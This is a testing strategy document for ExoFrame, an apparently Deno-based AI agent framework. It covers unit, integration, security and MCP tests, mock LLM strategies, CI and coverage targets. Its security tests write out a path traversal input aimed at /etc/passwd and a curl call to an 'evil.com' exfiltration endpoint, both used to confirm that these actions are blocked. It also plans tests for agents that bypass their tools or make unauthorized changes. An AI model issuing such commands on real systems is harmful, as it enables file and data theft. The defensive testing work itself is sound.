# ExoFrame Testing Strategy

- **Version:** 1.7.0
- **Release Date:** 2025-12-02
- **Status:** Planning Document
- **Reference:** [Implementation Plan](./ExoFrame_Implementation_Plan.md) Phase 6

---

## 1. Overview

This document defines the testing strategy for ExoFrame, covering:

- Test types and their purposes
- v1.0 test scope and priorities
- Pre-release test execution requirements
- Test infrastructure and tooling

### Testing Philosophy

ExoFrame follows a **test pyramid** approach:

```
      ┌─────────────┐
      │   Manual    │  ← Pre-release QA
      │     QA      │     (10 scenarios)
     ─┴─────────────┴─
    ┌─────────────────┐
    │   Integration   │  ← Workflow tests
    │      Tests      │     (10 scenarios)
   ─┴─────────────────┴─
  ┌───────────────────────┐
  │      Unit Tests       │  ← Component tests
  │   (per module)        │     (target: 70% coverage)
 ─┴───────────────────────┴─
┌───────────────────────────┐
│     Mock Infrastructure   │  ← MockLLM, TestEnvironment
└───────────────────────────┘
```

### Key Principles

1. **Deterministic by default** — Tests use mock LLM, not real APIs
2. **Isolated** — Each test creates/destroys its own environment
3. **Fast** — Full suite completes in under 2 minutes
4. **CI-first** — All automated tests run on every PR

---

## 2. Test Categories

### 2.1 Unit Tests

**Purpose:** Verify individual components work correctly in isolation.

**Location:** `tests/` (flat structure with `cli/`, `docs/`, `obsidian/` subdirs)

**Coverage Target:** 70% for core modules

| Module                  | Test File                          | Priority | Status      |
| ----------------------- | ---------------------------------- | -------- | ----------- |
| Config loader           | `tests/config_test.ts`             | P0       | ✅ Complete |
| Frontmatter/YAML parser | `tests/frontmatter_test.ts`        | P0       | ✅ Complete |
| Database service        | `tests/db_test.ts`                 | P0       | ✅ Complete |
| File watcher            | `tests/watcher_test.ts`            | P1       | ✅ Complete |
| Context loader          | `tests/context_loader_test.ts`     | P1       | ✅ Complete |
| Git service             | `tests/git_service_test.ts`        | P1       | ✅ Complete |
| Agent runner            | `tests/agent_runner_test.ts`       | P1       | ✅ Complete |
| Execution loop          | `tests/execution_loop_test.ts`     | P1       | ✅ Complete |
| MCP server              | `tests/mcp/server_test.ts`         | P1       | 📋 Planned  |
| MCP tools               | `tests/mcp/tools_test.ts`          | P1       | 📋 Planned  |
| Agent executor (MCP)    | `tests/agent_executor_test.ts`     | P1       | 📋 Planned  |
| Portal permissions      | `tests/portal_permissions_test.ts` | P1       | 📋 Planned  |
| Mission reporter        | `tests/mission_reporter_test.ts`   | P1       | ✅ Complete |
| Plan writer             | `tests/plan_writer_test.ts`        | P1       | ✅ Complete |
| Tool registry           | `tests/tool_registry_test.ts`      | P1       | ✅ Complete |
| Path resolver           | `tests/path_resolver_test.ts`      | P1       | ✅ Complete |
| Context card generator  | `tests/context_card_test.ts`       | P2       | ✅ Complete |
| Model adapter           | `tests/model_adapter_test.ts`      | P2       | ✅ Complete |
| CLI commands            | `tests/cli/*_test.ts`              | P2       | ✅ Complete |
| Obsidian integration    | `tests/obsidian/*_test.ts`         | P2       | ✅ Complete |

**Running Unit Tests:**

```bash
# Run all unit tests
deno task test

# Run with coverage collection (clears stale data automatically)
deno task test:coverage

# View coverage results (run after test:coverage)
deno task coverage        # Terminal summary (line/branch %)
deno task coverage:html   # HTML report → coverage/html/index.html
deno task coverage:lcov   # LCOV format → coverage/lcov.info (for CI)

# Run specific module
deno test --allow-all tests/config_test.ts

# Watch mode (re-runs on file changes)
deno task test:watch
```

**Note:** The coverage tasks filter to `src/` files only, excluding test files and
temporary directories created during daemon tests.

---

### 2.2 Integration Tests

**Purpose:** Verify complete workflows function correctly end-to-end.

**Location:** `tests/integration/`

**v1.0 Scenarios:**

| #  | Scenario                | Description                                 | Validates            | Status      |
| -- | ----------------------- | ------------------------------------------- | -------------------- | ----------- |
| 1  | **Happy Path**          | Request → Plan → Approve → Execute → Report | Core workflow        | ✅ Complete |
| 2  | **Plan Rejection**      | Request → Plan → Reject → Archive           | Rejection flow       | ✅ Complete |
| 3  | **Plan Revision**       | Request → Plan → Revise → New Plan          | Revision flow        | ✅ Complete |
| 4  | **Execution Failure**   | Approved plan fails during execution        | Error handling       | ✅ Complete |
| 5  | **Concurrent Requests** | Multiple requests processed simultaneously  | Race conditions      | ✅ Complete |
| 6  | **Context Overflow**    | Request references 50 large files           | Graceful truncation  | ✅ Complete |
| 7  | **Git Conflict**        | Agent and human edit same file              | Conflict detection   | ✅ Complete |
| 8  | **Daemon Restart**      | Daemon killed mid-execution                 | State recovery       | ✅ Complete |
| 9  | **Portal Access**       | Request accesses portal files               | Security enforcement | ✅ Complete |
| 10 | **Invalid Input**       | Malformed YAML frontmatter                  | Input validation     | ✅ Complete |
| 11 | **MCP Execution**       | Plan executed via MCP server                | MCP protocol flow    | 📋 Planned  |
| 12 | **Sandboxed Mode**      | Agent runs with no file access              | Security enforcement | 📋 Planned  |
| 13 | **Hybrid Mode Audit**   | Agent makes unauthorized file change        | Change detection     | 📋 Planned  |

**Test Structure:**

```typescript
// tests/integration/happy_path_test.ts
Deno.test("Happy Path: Request to Report", async (t) => {
  const env = await TestEnvironment.create();

  await t.step("create request", async () => {
    await env.createRequest("Implement login feature");
    await env.waitForPlan();
  });

  await t.step("verify plan created", async () => {
    const plan = await env.getPlan();
    assertExists(plan);
    assertEquals(plan.status, "review");
  });

  await t.step("approve plan", async () => {
    await env.approvePlan();
    await env.waitForExecution();
  });

  await t.step("verify report created", async () => {
    const report = await env.getReport();
    assertExists(report);
    assertEquals(report.status, "completed");
  });

  await t.step("verify git branch", async () => {
    const branches = await env.getGitBranches();
    assert(branches.some((b) => b.includes("feat/")));
  });

  await env.cleanup();
});
```

**Running Integration Tests:**

```bash
# Run all integration tests
deno test tests/integration/

# Run specific scenario
deno test tests/integration/happy_path_test.ts

# Run with verbose output
deno test tests/integration/ --reporter=verbose
```

---

### 2.3 Security Tests

**Purpose:** Verify Deno permission enforcement and path security.

**Location:** Tests are distributed across relevant test files with `[security]` label for filtering.

**Running Security Tests:**

```bash
# Run all security tests
deno task test:security

# Or manually with filter
deno test --allow-all --filter "[security]" tests/
```

**Attack Scenarios & Coverage:**

| Attack Vector            | Test File                        | Test Count | Status      |
| ------------------------ | -------------------------------- | ---------- | ----------- |
| **Path Traversal**       | `tests/path_resolver_test.ts`    | 5 tests    | ✅ Complete |
| **Portal Escape**        | `tests/path_resolver_test.ts`    | 2 tests    | ✅ Complete |
| **File System Escape**   | `tests/tool_registry_test.ts`    | 6 tests    | ✅ Complete |
| **Shell Injection**      | `tests/tool_registry_test.ts`    | 4 tests    | ✅ Complete |
| **Network Exfiltration** | `tests/tool_registry_test.ts`    | 1 test     | ✅ Complete |
| **Env Variable Theft**   | `tests/config_test.ts`           | 4 tests    | ✅ Complete |
| **Cross-Portal Access**  | `tests/integration/09_*_test.ts` | 4 tests    | ✅ Complete |

**Total:** 29 security tests (filtered via `[security]` label)

**Test Implementation Examples:**

```typescript
// tests/tool_registry_test.ts
Deno.test("[security] ToolRegistry: read_file - blocks path traversal to /etc/passwd", async () => {
  const registry = new ToolRegistry({ config, db });
  const result = await registry.execute("read_file", {
    path: "../../../etc/passwd",
  });
  assertEquals(result.success, false, "Path traversal should be blocked");
});

Deno.test("[security] ToolRegistry: run_command - blocks curl/wget for data exfiltration", async () => {
  const registry = new ToolRegistry({ config, db });
  const result = await registry.execute("run_command", {
    command: "curl",
    args: ["https://evil.com/exfil"],
  });
  assertEquals(result.success, false, "curl should be blocked");
});

// tests/config_test.ts
Deno.test("[security] Env Variable Security: Verify sensitive env vars are not in config", () => {
  // Verifies API_KEY, AWS_SECRET_ACCESS_KEY, etc. are not exposed
});
```

**Deno Permission Model:**

The production daemon (`deno task start:fg`) runs with restricted permissions:

- `--allow-read=.` — Only workspace directory
- `--allow-write=.` — Only workspace directory
- `--allow-net=api.anthropic.com,api.openai.com,localhost:11434` — Only LLM APIs
- `--allow-env=EXO_,HOME,USER` — Only EXO_* vars and identity

---

### 2.5 Performance Benchmarks

**Purpose:** Establish baselines and detect regressions.

**Location:** `tests/benchmarks/`

**Metrics & Targets:**

| Metric              | Target             | Regression Threshold |
| ------------------- | ------------------ | -------------------- |
| **Cold Start**      | < 100ms            | +20%                 |
| **Watcher Latency** | < 200ms            | +20%                 |
| **Plan Generation** | < 5s (mock)        | +20%                 |
| **Database Query**  | < 10ms             | +50%                 |
| **Context Loading** | < 500ms (20 files) | +20%                 |

**Benchmark Implementation:**

```typescript
// tests/benchmarks/startup_bench.ts
Deno.bench("Cold start time", async () => {
  const cmd = new Deno.Command("deno", {
    args: ["run", "--allow-all", "src/main.ts", "--version"],
  });
  await cmd.output();
});

// tests/benchmarks/watcher_bench.ts
Deno.bench("File watcher latency", async () => {
  const watcher = new FileWatcher(testDir);
  await Deno.writeTextFile(`${testDir}/test.md`, "content");
  await watcher.waitForEvent();
});
```

**Running Benchmarks:**

```bash
# Run all benchmarks
deno bench tests/benchmarks/

# Compare against baseline
deno bench tests/benchmarks/ --json > current.json
deno run scripts/compare_benchmarks.ts --baseline=baseline.json --current=current.json
```

---

### 2.6 Documentation Tests

**Purpose:** Prevent documentation drift from code.

**Location:** `tests/docs/`

**Test Categories:**

| Category             | Validates                        | Example                              |
| -------------------- | -------------------------------- | ------------------------------------ |
| **Section Presence** | Required sections exist          | "Installation" in User Guide         |
| **CLI Coverage**     | All commands documented          | `exoctl plan approve` has entry      |
| **Link Validity**    | Internal links resolve           | `[Dashboard](./Dashboard.md)` exists |
| **Code Examples**    | Examples are syntactically valid | TypeScript blocks compile            |

**Running Documentation Tests:**

```bash
deno test tests/docs/
```

---

### 2.4 Manual QA

**Purpose:** Catch issues that automated tests miss.

**When:** Before each major release (v1.0, v1.1, v2.0, etc.)

**Platform Matrix:**

| Platform              | Environment         | Required |
| --------------------- | ------------------- | -------- |
| Ubuntu 24.04          | Fresh VM, no Deno   | ✓ v1.0   |
| macOS (Apple Silicon) | Clean user account  | ✓ v1.0   |
| Windows 11 + WSL2     | Ubuntu 22.04 in WSL | ✓ v1.0   |

**QA Scenarios:**

See [Manual Test Scenarios](./ExoFrame_Manual_Test_Scenarios.md) for detailed test scripts with step-by-step commands and expected results.

---

## 3. Test Infrastructure

### 3.1 Mock LLM Provider

**Purpose:** Enable deterministic testing without API calls or costs.

**Location:** `src/ai/providers/mock_llm_provider.ts`

**Mock Strategies:**

| Strategy     | Use Case              | Implementation                   | Test Scenarios                           |
| ------------ | --------------------- | -------------------------------- | ---------------------------------------- |
| **Recorded** | Replay real responses | Hash prompt → lookup response    | Integration tests, realistic responses   |
| **Scripted** | Predictable sequences | Return responses in order        | Multi-step workflows, conversation flows |
| **Pattern**  | Dynamic responses     | Match prompt patterns → generate | Various request types, flexible testing  |
| **Failing**  | Error handling tests  | Always throw error               | Retry logic, error recovery              |
| **Slow**     | Timeout tests         | Add artificial delay             | Timeout handling, race conditions        |

#### Strategy Details

##### Recorded Strategy

**Purpose:** Replay real LLM responses captured from previous API calls.

**How it works:**

- Hashes the prompt using a deterministic algorithm to create a unique fingerprint
- Looks up response by prompt hash (tries exact match → preview match → pattern fallback)
- Can load recordings from fixture directory (`.json` files)
- Automatically falls back to pattern matching if no recording found (new in v1.7)

**When to use:**

- Integration tests requiring realistic, complex responses
- Testing with actual Claude/GPT output without API costs
- Regression testing against known-good responses
- Ensuring plan format consistency across versions

**Example:**

```typescript
const recorded = new MockLLMProvider("recorded", {
  fixtureDir: "./tests/fixtures/llm_responses",
});

// Uses recorded response if available, falls back to patterns
const plan = await recorded.generate("Implement authentication");
```

##### Scripted Strategy

**Purpose:** Return predefined responses in a fixed, predictable sequence.

**How it works:**

- Maintains an index into a responses array
- Returns responses in order on each call
- Cycles back to first response when array is exhausted
- Deterministic - same sequence every test run

**When to use:**

- Testing multi-step workflows where order matters
- Conversation flows and dialogue systems
- Sequential plan generation and approval cycles
- State machine testing

**Example:**

```typescript
const scripted = new MockLLMProvider("scripted", {
  responses: [
    "I'll analyze the request...",
    "Based on requirements, here's the plan...",
    "Implementation complete",
  ],
});

// Returns responses in order
await scripted.generate("step 1"); // → "I'll analyze..."
await scripted.generate("step 2"); // → "Based on..."
await scripted.generate("step 3"); // → "Implementation..."
await scripted.generate("step 4"); // → "I'll analyze..." (cycles)
```

##### Pattern Strategy

**Purpose:** Generate dynamic responses based on prompt content using regex matching.

**How it works:**

- Matches prompts against regex patterns in order
- Returns static string or calls function to generate dynamic response
- Uses first matching pattern in the patterns array
- Throws error if no pattern matches

**When to use:**

- Flexible testing of various request types without pre-recording
- Testing different plan formats (implement/fix/add/create)
- Dynamic response generation based on prompt content
- Prototyping before recording real responses

**Example:**

```typescript
const pattern = new MockLLMProvider("pattern", {
  patterns: [
    {
      pattern: /implement|add|create/i,
      response: "## Implementation Plan\n\n1. Design...\n2. Code...\n3. Test...",
    },
    {
      pattern: /fix|bug|error/i,
      response: "## Bug Fix Plan\n\n1. Reproduce\n2. Root cause\n3. Fix\n4. Test",
    },
    {
      pattern: /add (\w+) function/i,
      response: (match) => `Creating ${match[1]} function...`,
    },
  ],
});

// Matches patterns dynamically
await pattern.generate("Implement authentication"); // → Implementation Plan
await pattern.generate("Fix login bug"); // → Bug Fix Plan
await pattern.generate("Add hello function"); // → Creating hello function...
```

##### Failing Strategy

**Purpose:** Simulate API failures, network errors, and service unavailability.

**How it works:**

- Always throws `MockLLMError` on every `generate()` call
- Still tracks call count and history for test assertions
- Supports custom error messages to simulate specific failures
- Never returns a successful response

**When to use:**

- Testing error handling and recovery mechanisms
- Retry logic and exponential backoff
- Graceful degradation when LLM unavailable
- User-facing error messages

**Example:**

```typescript
const failing = new MockLLMProvider("failing", {
  errorMessage: "API rate limit exceeded (429)",
});

try {
  await failing.generate("any prompt");
} catch (error) {
  assertEquals(error.message, "API rate limit exceeded (429)");
  assertEquals(failing.callCount, 1); // Still tracks calls
}
```

##### Slow Strategy

**Purpose:** Simulate network latency, slow API responses, and timeout conditions.

**How it works:**

- Adds configurable delay (default 500ms) before returning response
- Cycles through responses array like scripted strategy (after delay)
- Uses real setTimeout, accurately simulates async delays

**When to use:**

- Testing request timeout handling
- Loading state UI and progress indicators
- Race condition testing
- Concurrent request processing
- Performance testing under slow network conditions

**Example:**

```typescript
const slow = new MockLLMProvider("slow", {
  delayMs: 5000, // 5 second delay
  responses: ["Delayed response"],
});

const start = Date.now();
const response = await slow.generate("test");
const elapsed = Date.now() - start;

assert(elapsed >= 5000); // Verifies delay occurred

// Test timeout behavior
const controller = new AbortController();
setTimeout(() => controller.abort(), 1000); // Timeout after 1s

try {
  await Promise.race([
    slow.generate("test"),
    new Promise((_, reject) => {
      controller.signal.addEventListener("abort", () => reject(new Error("Timeout")));
    }),
  ]);
} catch (error) {
  assertEquals(error.message, "Timeout");
}
```

#### Helper Functions

The module provides convenience functions for common testing scenarios:

```typescript
import { createFailingMock, createPlanGeneratorMock, createSlowMock } from "../src/ai/providers/mock_llm_provider.ts";

// Quick pattern-based mock with common plan formats
const planMock = createPlanGeneratorMock();

// Quick failing mock with custom message
const failMock = createFailingMock("Service unavailable");

// Quick slow mock with custom delay
const slowMock = createSlowMock(3000); // 3 second delay
```

**Recording Real Responses:**

```bash
# Record LLM responses during manual testing
EXO_RECORD_LLM=true exoctl request "Test task"

# Responses saved to tests/fixtures/llm_responses/<hash>.json
```

**Fixture Format:**

```json
{
  "prompt_hash": "abc123...",
  "prompt_preview": "You are a senior developer...",
  "response": "## Proposed Plan\n\n1. First, I will...",
  "model": "claude-3-5-sonnet",
  "tokens": { "input": 1500, "output": 800 },
  "recorded_at": "2025-11-30T10:00:00Z"
}
```

**Usage in Tests:**

```typescript
import { MockLLMProvider } from "../src/ai/providers/mock_llm_provider.ts";

Deno.test("Plan generation uses correct format", async () => {
  const mockLLM = new MockLLMProvider("recorded");
  const runner = new AgentRunner(config, mockLLM);

  const plan = await runner.generatePlan(request);

  assertStringIncludes(plan, "## Proposed Plan");
});
```

---

### 3.2 Test Environment

**Purpose:** Isolated, reproducible test workspace.

**Location:** `tests/helpers/test_environment.ts`

**Features:**

- Creates temporary directory for each test
- Scaffolds complete ExoFrame workspace
- Provides helper methods for common operations
- Automatic cleanup on test completion

**Usage:**

```typescript
import { TestEnvironment } from "../helpers/test_environment.ts";

Deno.test("Example test", async () => {
  const env = await TestEnvironment.create();

  // Create files
  await env.createRequest("Test task");

  // Wait for daemon processing
  await env.waitForPlan();

  // Make assertions
  const plan = await env.getPlan();
  assertExists(plan);

  // Cleanup
  await env.cleanup();
});
```

**TestEnvironment API:**

| Method                       | Description                 |
| ---------------------------- | --------------------------- |
| `create()`                   | Initialize test environment |
| `cleanup()`                  | Remove temp directory       |
| `createRequest(description)` | Create request file         |
| `waitForPlan()`              | Wait for plan generation    |
| `getPlan()`                  | Read current plan           |
| `approvePlan()`              | Move plan to Active         |
| `waitForExecution()`         | Wait for execution complete |
| `getReport()`                | Read generated report       |
| `getGitBranches()`           | List git branches           |
| `getActivityLog()`           | Query Activity Journal      |

---

### 3.3 CI/CD Integration

**GitHub Actions Workflow:**

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1
        with:
          deno-version: v2.x

      - name: Run unit tests
        run: deno test --allow-all

      - name: Check coverage
        run: |
          deno test --coverage=cov_profile
          deno coverage cov_profile --lcov > coverage.lcov

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: coverage.lcov

  integration-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run integration tests
        run: deno test tests/integration/ --allow-all

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run security tests
        run: deno test tests/security/ --allow-read=. --allow-run

  benchmarks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run benchmarks
        run: deno bench tests/benchmarks/ --allow-all

      - name: Compare with baseline
        run: |
          deno bench tests/benchmarks/ --json > current.json
          deno run --allow-read scripts/compare_benchmarks.ts \
            --baseline=tests/benchmarks/baseline.json \
            --current=current.json \
            --threshold=20
```

---

## 4. Pre-Release Checklist

### 4.1 Automated Tests (Must Pass)

Before any release, all automated tests must pass:

```bash
# Run complete test suite
deno task test:all

# This runs:
# - deno test (unit tests)
# - deno test tests/integration/
# - deno test tests/security/
# - deno test tests/docs/
# - deno bench tests/benchmarks/
```

**CI Status:** All GitHub Actions workflows must be green.

---

### 4.2 Manual QA Scenarios

**Execute on each target platform before major releases.**

See **[Manual Test Scenarios](./ExoFrame_Manual_Test_Scenarios.md)** for detailed step-by-step instructions with exact commands and expected results.

**Scenario Summary (14 total):**

| ID    | Scenario                 | Category       |
| ----- | ------------------------ | -------------- |
| MT-01 | Fresh Installation       | Setup          |
| MT-02 | Daemon Startup           | Setup          |
| MT-03 | Create Request           | Core Workflow  |
| MT-04 | Plan Generation (Mock)   | Core Workflow  |
| MT-05 | Plan Approval            | Core Workflow  |
| MT-06 | Plan Rejection           | Core Workflow  |
| MT-07 | Plan Execution (Mock)    | Core Workflow  |
| MT-08 | Portal Management        | Features       |
| MT-09 | Daemon Crash Recovery    | Error Handling |
| MT-10 | Real LLM Integration     | Integration    |
| MT-11 | Invalid Request Handling | Error Handling |
| MT-12 | Database Corruption      | Error Handling |
| MT-13 | Concurrent Requests      | Reliability    |
| MT-14 | File Watcher Reliability | Reliability    |

**Minimum for v1.0 Release:** MT-01 through MT-12 must pass on Ubuntu 24.04.

---

### 4.3 Sign-off Template

Use the **QA Sign-off Template** in [Manual Test Scenarios](./ExoFrame_Manual_Test_Scenarios.md#qa-sign-off-template) for release sign-off.

The template includes:

- Checklist for all 14 manual test scenarios
- Pass/Fail/Skip tracking with notes
- Issue documentation section
- Final verdict (Approved/Blocked)

---

## 5. MCP Testing Strategy

### 5.1 MCP Unit Tests

**tests/mcp/server_test.ts (25+ test cases):**

**Server Initialization:**

- `should start MCP server with stdio transport`
- `should start MCP server with SSE transport`
- `should register all 6 tools on start`
- `should register resources on start`
- `should register prompts on start`
- `should handle server initialization errors`

**Tool Registration:**

- `should expose read_file tool with correct schema`
- `should expose write_file tool with correct schema`
- `should expose list_directory tool with correct schema`
- `should expose git_create_branch tool with correct schema`
- `should expose git_commit tool with correct schema`
- `should expose git_status tool with correct schema`

**Resource Handling:**

- `should discover portal files as resources`
- `should format URIs as portal://PortalName/path`
- `should return resource content when requested`
- `should handle missing resources gracefully`

**Prompt Handling:**

- `should provide execute_plan prompt`
- `should provide create_changeset prompt`
- `should validate prompt arguments`

**Security:**

- `should validate portal permissions before tool execution`
- `should log all tool invocations to Activity Journal`
- `should reject unauthorized portal access`

**Error Handling:**

- `should handle invalid tool names`
- `should handle invalid tool parameters`
- `should handle tool execution errors`

**tests/mcp/tools_test.ts (30+ test cases):**

**read_file Tool:**

- `should read file within portal boundaries`
- `should reject path with ../ traversal`
- `should reject absolute paths`
- `should validate portal permissions`
- `should log invocation to Activity Journal`

**write_file Tool:**

- `should write file within portal boundaries`
- `should create parent directories if needed`
- `should reject path outside portal`
- `should validate write permissions`
- `should log file writes to Activity Journal`

**list_directory Tool:**

- `should list files in portal directory`
- `should handle missing directories`
- `should respect portal boundaries`
- `should return file metadata (name, size, type)`

**git_create_branch Tool:**

- `should create feature branch in portal repo`
- `should validate branch name format (feat/, fix/, docs/)`
- `should reject invalid branch names`
- `should validate git operation permissions`
- `should log branch creation to Activity Journal`

**git_commit Tool:**

- `should commit changes with trace_id in message`
- `should return commit SHA`
- `should log commit to Activity Journal with files`
- `should reject commit if no changes staged`
- `should validate git operation permissions`

**git_status Tool:**

- `should return portal git status`
- `should detect uncommitted changes`
- `should detect untracked files`

**Operation Restrictions:**

- `should block git tools if 'git' not in operations`
- `should block write_file if 'write' not in operations`
- `should allow read_file with only 'read' permission`

**Security Mode Tests:**

- `should enforce sandboxed mode (no file access)`
- `should enforce hybrid mode (read-only + audit)`
- `should detect unauthorized changes in hybrid mode`
- `should revert unauthorized changes in hybrid mode`

### 5.2 MCP Integration Tests

**tests/integration/15_plan_execution_mcp_test.ts:**

**Complete MCP Flow:**

- `should execute plan via MCP server (stdio transport)`
- `should execute plan via MCP server (SSE transport)`
- `should create feature branch via MCP`
- `should commit changes via MCP`
- `should register changeset after MCP execution`

**Sandboxed Mode:**

- `should run agent with no file system access`
- `should block agent from reading files directly`
- `should block agent from writing files directly`
- `should force all operations through MCP tools`

**Hybrid Mode:**

- `should allow agent to read portal files directly`
- `should require MCP tools for write operations`
- `should detect unauthorized file changes`
- `should revert unauthorized changes automatically`
- `should log security violations to Activity Journal`

**Permission Validation:**

- `should reject agent not in agents_allowed list`
- `should enforce operation restrictions (read/write/git)`
- `should validate portal existence before execution`

**Error Scenarios:**

- `should handle MCP server connection failures`
- `should handle MCP tool invocation errors`
- `should handle git operation failures`
- `should preserve plan state on execution errors`

### 5.3 MCP Security Tests

**tests/security/mcp_security_test.ts:**

**Sandboxed Mode Security:**

- `should prevent file system access bypass attempts`
- `should prevent network access from agent subprocess`
- `should prevent environment variable access`
- `should log all security violations`

**Hybrid Mode Security:**

- `should detect file writes outside MCP tools`
- `should detect directory creation outside MCP tools`
- `should detect file deletion outside MCP tools`
- `should audit git operations not via MCP`

**Permission Enforcement:**

- `should block portal access for unlisted agents`
- `should block operations not in allowed list`
- `should validate all tool parameters`
- `should prevent path traversal attacks`

---

## 6. v1.0 Test Scope

### 6.1 In Scope (Must Have)

| Category                | Items                                                                | Status      |
| ----------------------- | -------------------------------------------------------------------- | ----------- |
| **Unit Tests**          | Config, Database, Watcher, Context Loader, Git Service + 12 more     | ✅ Complete |
| **MCP Unit Tests**      | MCP server (25+ tests), MCP tools (30+ tests)                        | 📋 Planned  |
| **Integration Tests**   | Scenarios 1-10 (all 10 scenarios implemented)                        | ✅ Complete |
| **MCP Integration**     | Scenarios 11-13 (MCP execution, security modes)                      | 📋 Planned  |
| **Security Tests**      | Path traversal, Network exfil, Env theft, Shell injection (29 tests) | ✅ Complete |
| **MCP Security Tests**  | Sandboxed/Hybrid mode enforcement, unauthorized access               | 📋 Planned  |
| **Documentation Tests** | User Guide sections, CLI coverage                                    | ✅ Complete |
| **Manual QA**           | All 14 scenarios on Ubuntu (see Manual Test Scenarios doc)           | 🔲 Planned  |

### 5.2 In Scope (Should Have)

| Category                   | Items                       | Status     |
| -------------------------- | --------------------------- | ---------- |
| **Performance Benchmarks** | Cold start, Watcher latency | 🔲 Planned |
| **Manual QA**              | macOS, Windows WSL2         | 🔲 Planned |

### 5.3 Out of Scope (v1.1+)

| Category          | Items                         | Reason          |
| ----------------- | ----------------------------- | --------------- |
| **Flow Tests**    | Multi-agent orchestration     | Phase 7 feature |
| **Load Testing**  | Concurrent users, high volume | Single-user MVP |
| **Fuzzing**       | Random input generation       | Nice-to-have    |
| **Accessibility** | Screen reader, keyboard nav   | No UI in v1.0   |

---

## 7. Risk-to-Test Traceability

Every identified risk maps to at least one automated test:

| Risk ID    | Risk                           | Test File                              | Test Type   |
| ---------- | ------------------------------ | -------------------------------------- | ----------- |
| T-PATH     | Path traversal attack          | `tests/security/permission_test.ts`    | Security    |
| T-LEASE    | Lease starvation (deadlock)    | `tests/leases/heartbeat_test.ts`       | Unit        |
| T-CONTEXT  | Context overflow crashes agent | `tests/context/context_loader_test.ts` | Unit        |
| T-GIT      | Git identity drift             | `tests/git/git_service_test.ts`        | Unit        |
| T-WATCH    | Watcher misses file events     | `tests/watcher/stability_test.ts`      | Unit        |
| T-DOC      | Documentation outdated         | `tests/docs/user_guide_test.ts`        | Docs        |
| T-NET      | Unauthorized network access    | `tests/security/permission_test.ts`    | Security    |
| T-ENV      | Env variable theft             | `tests/security/permission_test.ts`    | Security    |
| T-MCP-BYPS | Agent bypasses MCP tools       | `tests/mcp/tools_test.ts`              | MCP         |
| T-MCP-PERM | Unauthorized portal access     | `tests/security/mcp_security_test.ts`  | MCP         |
| T-MCP-AUDT | Undetected unauthorized change | `tests/integration/15_*_mcp_test.ts`   | Integration |

---

## 8. Test Maintenance

### 8.1 Adding New Tests

1. Create test file in appropriate directory (`tests/<category>/`)
2. Follow naming convention: `<feature>_test.ts`
3. Use `TestEnvironment` for integration tests
4. Use `MockLLMProvider` for any LLM interactions
5. Add to CI workflow if new category

### 7.2 Updating Fixtures

```bash
# Re-record LLM responses after prompt changes
EXO_RECORD_LLM=true deno task dry-run

# Update benchmark baselines after optimization
deno bench tests/benchmarks/ --json > tests/benchmarks/baseline.json
git add tests/benchmarks/baseline.json
git commit -m "chore: update benchmark baselines"
```

### 7.3 Flaky Test Policy

- Flaky tests are **bugs** — fix immediately or disable with `TODO`
- Use `Deno.test({ ignore: true }, ...)` for temporarily disabled tests
- Track disabled tests in GitHub issues
- No more than 3 disabled tests at any time

---

---

## 9. Code Coverage Strategy

ExoFrame uses Deno's built-in coverage tool to track test coverage, ensuring reliability and maintainability.

### 9.1 Coverage Goals

We aim for high confidence in our codebase through meaningful tests.

| Metric              | Target (Production) | Stretch Goal |
| :------------------ | :------------------ | :----------- |
| **Line Coverage**   | ≥ 80%               | ≥ 90%        |
| **Branch Coverage** | ≥ 70%               | ≥ 85%        |

**Why Branch Coverage?**
Branch coverage is more critical than line coverage as it ensures all decision paths (if/else, switch, loops) are exercised, catching edge cases that line coverage might miss.

### 9.2 Improvement Plan

To reach our coverage targets, we follow a phased approach focusing on critical modules first.

#### Priority Areas

1. **Critical Infrastructure** (High Priority)
   - **Modules:** `config/service.ts`, `services/path_resolver.ts`, `services/db.ts`
   - **Focus:** Security validation, error handling, and data integrity.
   - **Actions:** Add comprehensive tests for invalid inputs, file system errors, and transaction rollbacks.

2. **Core Services** (Medium Priority)
   - **Modules:** `services/watcher.ts`, `services/context_loader.ts`, `services/agent_runner.ts`
   - **Focus:** Stability, resource management, and error recovery.
   - **Actions:** Test edge cases like disk full, network timeouts, and concurrent modifications.

3. **CLI & Tools** (Lower Priority)
   - **Modules:** `cli/*`, `services/git_service.ts`
   - **Focus:** User interaction and external tool integration.
   - **Actions:** Verify signal handling and git operation failures.

### 9.3 Implementation Strategy

When adding new features or refactoring:

1. **TDD Approach:** Write tests before implementation.
2. **Gap Analysis:** Run coverage to identify uncovered branches.
3. **Edge Cases:** Explicitly test error paths (network fail, permission denied).
4. **Verification:** Ensure new code meets the 80% line coverage target.

### 9.4 Testing Best Practices

1. **Test One Behavior Per Test:** Keep tests focused and atomic.
2. **Descriptive Names:** Use names like `should reject path traversal with ../` instead of `should work`.
3. **Mock External Dependencies:** Isolate unit tests from file system and network using mocks.
4. **Test Error Paths:** Most bugs hide in error handling logic. Verify that exceptions are caught and handled gracefully.

### 9.5 Tools & Reports

The `scripts/coverage.sh` script provides an all-in-one solution:

```bash
# Summary report (default)
./scripts/coverage.sh

# HTML report (interactive, great for finding gaps)
./scripts/coverage.sh html

# LCOV report (standard format)
./scripts/coverage.sh lcov

# Detailed line-by-line report
./scripts/coverage.sh detailed
```

#### Report Types

- **Summary:** Quick overview of percentages per file.
- **HTML:** Interactive visualization. Highlights uncovered lines in red. Located at `coverage/html/index.html`.
- **LCOV:** Standard format for CI/CD tools (Codecov, Coveralls). Located at `coverage/lcov.info`.

### 9.6 CI/CD Integration

Example GitHub Actions workflow:

```yaml
- name: Run tests with coverage
  run: deno task test:coverage

- name: Generate LCOV report
  run: deno task coverage:lcov

- name: Upload to Codecov
  uses: codecov/codecov-action@v3
  with:
    files: ./coverage/lcov.info
```

### 9.7 Configuration

Coverage settings are defined in `deno.json`.

**Exclusions:**

- Test files (`*.test.ts`)
- Files outside `src/`
- Third-party dependencies

To adjust exclusions, edit the `--exclude` pattern in the `test:coverage` task.

---

